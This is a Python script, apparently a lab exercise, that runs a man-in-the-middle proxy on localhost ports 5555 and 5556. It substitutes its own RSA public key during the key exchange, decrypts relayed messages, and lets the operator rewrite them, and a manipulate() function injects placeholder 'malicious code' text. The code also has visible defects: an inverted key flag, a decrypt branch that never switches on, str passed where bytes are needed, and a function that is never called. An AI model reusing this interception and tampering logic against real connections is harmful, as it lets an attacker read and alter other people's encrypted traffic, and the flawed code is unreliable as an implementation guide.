#!/usr/bin/python3.7

import socket
import sys
import select
import rsa
from termcolor import cprint


def start():
    """
    Main functionality of the program
    :return:
    """

    print('Server messages are white')
    cprint('Client messages are red\n', 'red')

    use_existing_rsa_key = False
    if use_existing_rsa_key:

        # Generate own RSA keys
        pub_key, priv_key = rsa.newkeys(4096, poolsize=2)

    else:

        try:
            with open('mitm_pub.pem', mode='rb') as file:
                pub_key = rsa.PublicKey.load_pkcs1(file.read())

            with open('mitm_priv.pem', mode='rb') as file:
                priv_key = rsa.PrivateKey.load_pkcs1(file.read())

        except FileNotFoundError:

            print('Could not locate RSA keys, generating new ones', file=sys.stderr)
            pub_key, priv_key = rsa.newkeys(4096, poolsize=2)

            with open('mitm_pub.pem', mode='wb') as file:
                file.write(rsa.PublicKey.save_pkcs1(pub_key))

            with open('mitm_priv.pem', mode='wb') as file:
                file.write(rsa.PrivateKey.save_pkcs1(priv_key))

    # Spawn server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock:
        my_address = ('localhost', 5556)
        client_sock.bind(my_address)
        client_sock.listen(1)
        client_to_mitm, address = client_sock.accept()
        client_sock.setblocking(False)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:
            server_address = ('localhost', 5555)
            print('Connected to server at port: 5555')
            cprint('Connected to client at port: 5556\n', 'red')
            server_sock.connect(server_address)
            client_sock.setblocking(False)

            server_rsa = None
            client_rsa = None
            decrypt = False

            while True:
                server_ready = select.select([server_sock], [], [], 0)
                if server_ready[0]:
                    # Server --> Client
                    data = server_sock.recv(1024)

                    if decrypt is False:
                        if data != b'':
                            print('{}{}'.format(data, '\n'))

                        client_to_mitm.sendall(data)

                    elif decrypt is True:
                        if server_rsa is not None:
                            plaintext = rsa.decrypt(data, priv_key)
                            print(plaintext.decode())
                            client_to_mitm.sendall(rsa.encrypt(plaintext, client_rsa))

                        elif data[0:30] == b'-----BEGIN RSA PUBLIC KEY-----':
                            cprint('{}'.format(data))
                            server_rsa = rsa.PublicKey.load_pkcs1(data)
                            client_to_mitm.sendall(rsa.PublicKey.save_pkcs1(pub_key))

                        else:
                            print(data)

                client_ready = select.select([client_to_mitm], [], [], 0)
                if client_ready[0]:
                    # Client --> Server
                    data = client_to_mitm.recv(1024)

                    if decrypt is False:
                        if data != b'':
                            cprint('{}{}'.format(data, '\n'), 'red')

                        server_sock.sendall(data)

                    elif decrypt is True:
                        if client_rsa is not None:
                            plaintext = rsa.decrypt(data, priv_key)
                            cprint(plaintext.decode(), 'red')
                            plaintext = input('Replacing with: ')
                            server_sock.sendall(rsa.encrypt(plaintext, server_rsa))

                        elif data[0:30] == b'-----BEGIN RSA PUBLIC KEY-----':
                            cprint(data, 'red')
                            client_rsa = rsa.PublicKey.load_pkcs1(data)
                            server_sock.sendall(rsa.PublicKey.save_pkcs1(pub_key))

                        else:
                            cprint(data, 'red')


def manipulate(plaintext):
    """
    Manipulate messages that have been intercepted and decrypted
    :param plaintext: Message sent between client and server
    :return:
    """
    if plaintext == b'real message':
        return b'fake message\nwith malicious code'

    elif plaintext == b'this is my file\n':
        return ''.join([plaintext.decode(), 'malicious code\n']).encode()

    else:
        return plaintext


if __name__ == '__main__':
    start()
